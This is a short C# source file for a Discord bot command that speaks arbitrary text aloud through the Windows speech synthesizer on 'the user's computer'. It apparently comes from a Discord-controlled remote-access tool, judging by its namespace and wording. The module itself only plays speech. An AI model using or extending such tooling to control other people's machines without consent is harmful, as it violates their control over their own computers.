using System;
using System.Speech.Synthesis;
using System.Threading;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class TextToSpeech : ModuleBase<SocketCommandContext>
    {
        [Command("tts"), Alias("say")]
        [Summary("Plays A Text-To-Speech Message On The User's Computer.")]
        public async Task TTS([Remainder]string text)
        {
            var message = await ReplyAsync("Processing TTS request...");
            var synth = new SpeechSynthesizer();

            try
            {
                synth.SpeakAsync(text);
                Thread.Sleep(1500);
                while (synth.State == SynthesizerState.Speaking)
                {
                    Thread.Sleep(15);
                }
                await message.ModifyAsync(properties => properties.Content = $"Successfully played TTS message: \"{text}\"");
            }
            catch (Exception ex)
            {
                await message.ModifyAsync(properties => properties.Content = $"Error: {ex.Message}");
            }
            finally
            {
                synth.Dispose();
            }
        }
    }
}